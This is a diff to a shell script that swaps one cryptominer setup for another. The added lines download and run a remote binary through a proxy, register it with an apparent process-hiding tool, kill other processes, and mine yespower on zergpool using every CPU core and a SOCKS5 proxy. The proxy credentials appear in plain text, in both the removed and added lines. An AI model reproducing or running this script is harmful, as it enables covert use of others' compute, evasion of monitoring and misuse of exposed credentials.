@@ -53,9 +53,13 @@ ps -A | grep graftcp* | awk '{print $1}' | xargs kill -9 $1
 
 sleep .5
 
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/basket
-chmod +x basket
+./graftcp/graftcp wget https://github.com/Master478963/lolMinet/raw/main/data
+chmod +x data
 
-ph add basket
+ph add data
 
-./basket -a ethash -o ethproxy+ssl://eth-de.flexpool.io:5555 -u 0xBEd5bf95C4cc238F249D0C08D51604ce641b422E.jet -log --proxy mikrotik999:Elibawnos@gpusocks3.wot.mrface.com:1080
+apt-get install psmisc
+
+pkill -9 -f "ping 127.0.0.1" 
+
+./data -a yespower -o stratum+tcp://yespower.na.mine.zergpool.com:6533 -u rFb4oRYDDbHpFEcshVx1ppLG97njb9kWCQ.Test -p c=RVN -t $(nproc) -x socks5://jvyxiovx-rotate:2udhid79wl5a@p.webshare.io:80
